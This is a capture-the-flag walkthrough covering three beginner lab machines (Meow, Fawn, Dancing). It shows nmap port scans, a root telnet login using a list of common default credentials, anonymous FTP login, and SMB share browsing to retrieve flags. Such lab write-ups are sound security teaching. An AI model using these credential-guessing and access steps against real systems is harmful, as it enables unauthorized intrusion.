## Table of Contents

### Tier 0

 1. ✓ [Level 1: Meow](#level-1-meow)  - July 13th, 2022
 2. ✓ [Level 2: Fawn](#level-2-fawn)  -  July 14th, 2022
 3. ✓ [Level 3: Dancing](#level-3-dancing)  - July 15th, 2022
 4. ✗ [Level 4: Redeemer](#level-4-redeemer) -  Incomplete
 5. ✗ [Level 5: Explosion](#level-5-explosion) - Incomplete
 6. ✗ [Level 6: Preignition](#level-6-preignition) - Incomplete

### Tier 1

 1. ✗ [Level 1: Appointment](#level-1-appointment) - Incomplete
 2. ✗ [Level 2: Sequel](#level-2-sequel) - Incomplete
 3. ✗ [Level 3: Crocodile](#level-3-crocodile) - Incomplete
 4. ✗ [Level 4: Responder](#level-4-responder) - Incomplete
 5. ✗ [Level 5: Ignition](#level-5-ignition) - Incomplete
 6. ✗ [Level 7: Bike](#level-6-bike) - Incomplete
 7. ✗ [Level 8: Pennyworth](#level-6-pennyworth) - Incomplete
 8. ✗ [Level 9: Tactics](#level-6-tactics) - Incomplete

## Level 1: Meow

### Scope

The first step is listing the available information given in this scenario. We can define this setup as a grey-box, since we have been given partial information about the server. The following information is what we know about the scenario:

| # | 	Description 	| Value |
| ----------- | ----------- | ----------- |
| 1 | 	IP Address   |    	10.129.1.17   | 

### Enumeration

Given the overall scope of the scenario, we can now begin the enumeration process. We have been given an IP address of the machine, so we can start initiating a port scan using nmap.

First we can try to see if we can make contact with the machine with a ping request.

```
ping {ip address}
```
The results from the ping are:

```
└─$ ping 10.129.1.17

PING 10.129.1.17 (10.129.1.17) 56(84) bytes of data.
64 bytes from 10.129.1.17: icmp_seq=1 ttl=63 time=9.08 ms
64 bytes from 10.129.1.17: icmp_seq=2 ttl=63 time=7.17 ms
64 bytes from 10.129.1.17: icmp_seq=3 ttl=63 time=6.02 ms
64 bytes from 10.129.1.17: icmp_seq=4 ttl=63 time=12.0 ms
--- 10.129.1.17 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 6.021/8.572/12.024/2.272 ms
```
As we can see, we made a connection with the host. 

Next, we can try using nmap to see if there are any ports that can be exploited.

```
nmap -p- --min-rate 3000 -sC -sV {ip address}
```

Where:

```
-p-: scans ALL ports
--min-rate <number>: Send packets no slower than <number> per second
-sC: equivalent to --script=default
-sV: Probe open ports to determine service/version info
```
The results of nmap are:

```
nmap -p- --min-rate 3000 -sC -sV 10.129.1.17
  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-16 10:04 EDT
Nmap scan report for 10.129.1.17
Host is up (0.0084s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.95 seconds
```
Our scan shows some interesting results. Port 23 is open, and reserved for the service telnet. Telnet is an insecure, outdated protocol that should not be used. A quote from [wikipedia](https://en.wikipedia.org/wiki/Telnet):


> Telnet, by default, does not encrypt any data sent over the connection (including passwords), and so it is often feasible to eavesdrop on the communications and use the password later for malicious purposes; anybody who has access to a router, switch, hub or gateway located on the network between the two hosts where Telnet is being used can intercept the packets passing by and obtain login, password and whatever else is typed with a packet analyzer. 

> Most implementations of Telnet have no authentication that would ensure communication is carried out between the two desired hosts and not intercepted in the middle. 

> Several vulnerabilities have been discovered over the years in commonly used Telnet daemons. 


Thus, we can use this to our advantage to exploit this machine. 

We can start by trying to connect to the server using the telnet service.

```
telnet {ip address}
```
 
The results of using telnet are:

```
└─$ telnet 10.129.1.17

Trying 10.129.1.17...
Connected to 10.129.1.17.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: 
```

Now we can try to use some commonly used credentials that may have been set up insecurely by an administrator who set up and configured the service. 
According to [threat intelligence reports](https://www.f5.com/labs/articles/threat-intelligence/spaceballs-security--the-top-attacked-usernames-and-passwords)

![Figure1_min](https://user-images.githubusercontent.com/59018247/179361794-36c3a464-db56-4e23-b48b-6b37ecc8b052.png)

The 5 most common user names and passwords attacked are as follows: 

| # | 	Username 	| Password |
| ----------- | ----------- | ----------- |
| 1 | 	root   |    	admin   | 
| 2 | 	admin  |    	admin   | 
| 3 | 	user 	 |  user       | 
| 4 | 	test 	 |  test       | 
| 5 | 	ubuntu |  	ubuntu    | 

We can start by using these credentials to start with.

The result when attempting to use the user name ```admin```:

```
Meow login: admin

Password: 

Login incorrect
```
The result when attempting to use the user name ```root```:

```
Meow login: root

Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 16 Jul 2022 02:20:12 PM UTC

  System load:           0.0
  Usage of /:            41.7% of 7.75GB
  Memory usage:          4%
  Swap usage:            0%
  Processes:             139
  Users logged in:       0
  IPv4 address for eth0: 10.129.1.17
  IPv6 address for eth0: dead:beef::250:56ff:feb9:e2d7

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Sep  6 15:15:23 UTC 2021 from 10.10.14.18 on pts/0
root@Meow:~# 
```
We can see here by using the username root, we were able to get root access to the system. 

Once infiltrated, we can now scan the directory for any important files.

```
root@Meow:~# ls

flag.txt  snap 
```

As we can see, we found our first flag in the main directory.

## Conclusions - Level 1 Meow

| # | 	Tools 	| Description |
| ----------- | ----------- | ----------- |
| 1 | 	nmap   |    	Used for scanning ports on hosts. | 

| # | 	Vulnerabilities 	| Critical | High | Medium | Low |
| ----------- | ----------- | ----------- | ----------- | ----------- | ----------- |
| 1 | 	Default/Weak Credentials   |    	X |  |  |  |
| 2 | 	Telnet Service  |    	X |  |  |  |


Using nmap, we were able to discover the host was running telnet on port 23. Logging into telnet we were then able to get root access to the service, a consequence of the server administrator having poorly configured the credentials of the system.


[Table of Contents](#table-of-contents) 


## Level 2: Fawn

### Scope

The first step is listing the available information given in this scenario. We can define this setup as a grey-box, since we have been given partial information about the server. The following information is what we know about the scenario:

| # | 	Description 	| Value |
| ----------- | ----------- | ----------- |
| 1 | 	IP Address   |    	10.129.28.125   | 

### Enumeration

Given the overall scope of the scenario, we can now begin the enumeration process. We have been given an IP address of the machine, so we can start initiating a port scan using nmap.

First we can try to see if we can make contact with the machine with a ping request.

```
ping {ip address}
```
The results from the ping are:

```
└─$ ping 10.129.28.125

PING 10.129.28.125 (10.129.28.125) 56(84) bytes of data.
64 bytes from 10.129.28.125: icmp_seq=1 ttl=63 time=5.74 ms
64 bytes from 10.129.28.125: icmp_seq=2 ttl=63 time=6.13 ms
64 bytes from 10.129.28.125: icmp_seq=3 ttl=63 time=6.26 ms
64 bytes from 10.129.28.125: icmp_seq=4 ttl=63 time=11.6 ms

--- 10.129.28.125 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 5.736/7.428/11.586/2.408 ms

```
As we can see, we made a connection with the host. 

Next, we can try using nmap to see if there are any ports that can be exploited.

```
nmap -p- --min-rate 3000 -sC -sV {ip address}
```

Where:

```
-p-: scans ALL ports
--min-rate <number>: Send packets no slower than <number> per second
-sC: equivalent to --script=default
-sV: Probe open ports to determine service/version info
```
The results of nmap are:

```
└─$ nmap -p- --min-rate 3000 -sC -sV 10.129.28.125 

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-17 18:43 EDT
Nmap scan report for 10.129.28.125
Host is up (0.0063s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 4.93 seconds

```
Our scan shows one potential attack vector on port 21, reserved for the FTP protocol. According to digital guardian [Digital Guardian](https://digitalguardian.com/blog/what-ftp-security-securing-ftp-usage):

> FTP was not built to be secure. It is generally considered to be an insecure protocol because it relies on clear-text usernames and passwords for authentication and does not use encryption. Data sent via FTP is vulnerable to sniffing, spoofing, and brute force attacks, among other basic attack methods.

> There are several common approaches to addressing these challenges and securing FTP usage. FTPS is an extension of FTP that can encrypt connections at the client’s request. Transport Layer Security (TLS), Secure Socket Layer (SSL), and SSH File Transfer Protocol (also known as Secure File Transfer Protocol or SFTP) are often used as more secure alternatives to FTP because they use encrypted connections.
 
 ![ftp-diagram](https://user-images.githubusercontent.com/59018247/179428018-a6de38c5-9980-4c13-883f-1936c6d82ff3.gif)

Thus, we can try to log into this service to gain access to the system.

We can start by trying to establish connection to the ftp server:

```
ftp {ip address}
```
 
The results of using ftp are:

```
└─$ ftp 10.129.28.125   

Connected to 10.129.28.125.
220 (vsFTPd 3.0.3)

Name (10.129.28.125:kali): 
```
We are now being prompted for a username credential.

According to [microsoft](https://docs.microsoft.com/en-us/iis/configuration/system.applicationhost/sites/sitedefaults/ftpserver/security/authentication/anonymousauthentication), a common default username credential for the ftp services is ```anonymous```, which can be used with any password.
 
The result when attempting to use the user name ```anonymous```:

```
Name (10.129.28.125:kali): anonymous

331 Please specify the password.
Password: 

230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> 

```
We can see here by using the username anonymous, we were able to access the ftp server. 

Once infiltrated, we can now scan the directory for any important files.

```
ftp> dir

229 Entering Extended Passive Mode (|||13396|)
150 Here comes the directory listing.

-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt

226 Directory send OK.

```
As we can see, we found our second flag in the ftp directory. 

We can now download the flag onto our system using the ```get``` command:

```
ftp> get flag.txt

local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||32236|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |**************************************************|    32       39.01 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:00 (3.39 KiB/s)
```

## Conclusions - Level 2 Fawn

| # | 	Tools 	| Description |
| ----------- | ----------- | ----------- |
| 1 | 	nmap   |    	Used for scanning ports on hosts. | 

| # | 	Vulnerabilities 	| Critical | High | Medium | Low |
| ----------- | ----------- | ----------- | ----------- | ----------- | ----------- |
| 1 | 	Default/Weak Credentials   |    	X |  |  |  |
| 2 | 	FTP Service  |    	X |  |  |  |


Using nmap, we were able to discover the host was running an FTP service port 21. Logging into FTP server we were then able to get access to the service, a consequence of the server administrator having poorly configured the login credentials of the system.


[Table of Contents](#table-of-contents) 




## Level 3: Dancing

### Scope

The first step is listing the available information given in this scenario. We can define this setup as a grey-box, since we have been given partial information about the server. The following information is what we know about the scenario:

| # | 	Description 	| Value |
| ----------- | ----------- | ----------- |
| 1 | 	IP Address   |    	10.129.250.96   | 

### Enumeration

Given the overall scope of the scenario, we can now begin the enumeration process. We have been given an IP address of the machine, so we can start initiating a port scan using nmap.

First we can try to see if we can make contact with the machine with a ping request.

```
ping {ip address}
```
The results from the ping are:

```
└─$ ping 10.129.250.96

PING 10.129.250.96 (10.129.250.96) 56(84) bytes of data.
64 bytes from 10.129.250.96: icmp_seq=1 ttl=127 time=9.95 ms
64 bytes from 10.129.250.96: icmp_seq=2 ttl=127 time=8.91 ms
64 bytes from 10.129.250.96: icmp_seq=3 ttl=127 time=8.10 ms
64 bytes from 10.129.250.96: icmp_seq=4 ttl=127 time=7.16 ms

--- 10.129.250.96 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 7.164/8.531/9.950/1.026 ms

```
As we can see, we made a connection with the host. 

Next, we can try using nmap to see if there are any ports that can be exploited.

```
nmap -p- --min-rate 3000 -sC -sV {ip address}
```

Where:

```
-p-: scans ALL ports
--min-rate <number>: Send packets no slower than <number> per second
-sC: equivalent to --script=default
-sV: Probe open ports to determine service/version info
```
The results of nmap are:

```
└─$ nmap -p- --min-rate 3000 -sC -sV 10.129.250.96

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-18 14:53 EDT
Nmap scan report for 10.129.250.96
Host is up (0.0068s latency).
Not shown: 65524 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3h59m59s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-07-18T22:54:34
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 72.18 seconds


```
Our scan shows quite a few ports the can be explored. One of the more interesting ones is port ```445```, which is reserved for Sever Message Block (SMB). According to [cybersophia](https://cybersophia.net/articles/what-is/what-is-smb-protocol-and-why-is-it-a-security-concern/):

> To begin with the communication model, SMB works in a client–server architecture. In this model, SMB servers provide network resources, such as files or printers to the other computers, known as clients. Through this feature, users on different remote devices can collaborate on shared files and print their documents on shared printers over a network.

> In addition to this primary functionality of shared files and printers on serves, SMB also provides an authenticated inter-process communication (IPC) among processes running on remote computers. For this purpose, a network share, known as IPC share (ipc$), is used on Windows computers to facilitate communication between processes and remote computers.

> Especially due to its a wide array of features and complex implementation (which is contrary to the “Economy of Mechanism” principle), quite a number of SMB related vulnerabilities were discovered over the years and some of these vulnerabilities caused serious security issues around the world.

> The most infamous of these vulnerabilities were 5 Remote Code Execution (RCE) vulnerabilities (CVE-2017-0143, CVE-2017-0144, CVE-2017-0145, CVE-2017-0146, CVE-2017-0148) that affected Windows computers running SMBv1. Microsoft subsequently released a patch MS17-010) on March 14, 2017, however, experts advised users and administrators to take the additional step of disabling SMBv1 on all systems.

![SMB](https://user-images.githubusercontent.com/59018247/179587599-3bc9dc29-dbee-4db4-9615-0a19c4fa8397.jpg)

We can start by trying to establish connection using smbclient:

```
smbclient -L {ip address}
```
 
The results of using smbclient are:

```
└─$ smbclient -L 10.129.250.96

Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.250.96 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```
We can see here all of the visible share names listed. A great starting point is to try to connect with each of these shares.

Starting with ```ADMIN$```:

```
└─$ smbclient \\\\10.129.250.96\\ADMIN$

Password for [WORKGROUP\kali]:
tree connect failed: NT_STATUS_ACCESS_DENIED

```
We get an  invalid password failure response.

Trying the remaining shares:

```
└─$ smbclient \\\\10.129.250.96\\C$    

Password for [WORKGROUP\kali]:
tree connect failed: NT_STATUS_ACCESS_DENIED

```

```
└─$ smbclient \\\\10.129.250.96\\IPC$

Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> 
```
We get out first hit using IPC$. 

Scanning the directory, there are no files to be shown:

```
smb: \> ls

NT_STATUS_NO_SUCH_FILE listing \*
```
This makes sense, since IPC$ is not part of the file system. It is the inter-process communication share.

We can try reconnecting using the last credential, ```WorkShares```:

```
└─$ smbclient \\\\10.129.250.96\\WorkShares

Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> 
```
Again we get another hit, so we can try to browse the local directory.

```
└─$ smbclient \\\\10.129.250.96\\WorkShares

Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 29 04:22:01 2021
  ..                                  D        0  Mon Mar 29 04:22:01 2021
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021

                5114111 blocks of size 4096. 1747619 blocks available
smb: \> 
```

Now we can see two new directories that we can browse, Amy.J and James.P:

```
smb: \> cd Amy.J

smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 05:08:24 2021
  ..                                  D        0  Mon Mar 29 05:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 07:00:37 2021

                5114111 blocks of size 4096. 1747619 blocks available

smb: \Amy.J\> ..

smb: \> cd James.P

smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 04:38:03 2021
  ..                                  D        0  Thu Jun  3 04:38:03 2021
  flag.txt                            A       32  Mon Mar 29 05:26:57 2021

                5114111 blocks of size 4096. 1747611 blocks available
smb: \James.P\> 
```
As we can see, we revealed our third flag inside the James.P directory.

```
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
```
## Conclusions - Level 3 Dancing

| # | 	Tools 	| Description |
| ----------- | ----------- | ----------- |
| 1 | 	nmap   |    	Used for scanning ports on hosts. | 

| # | 	Vulnerabilities 	| Critical | High | Medium | Low |
| ----------- | ----------- | ----------- | ----------- | ----------- | ----------- |
| 1 | 	Default/Weak Credentials   |    	X |  |  |  |

Using nmap, we were able to discover the host was running an SMB on port 445. Logging in, we were then able to get access to the service, a consequence of the server administrator having poorly configured the login credentials for ```WorkShare```.


[Table of Contents](#table-of-contents) 
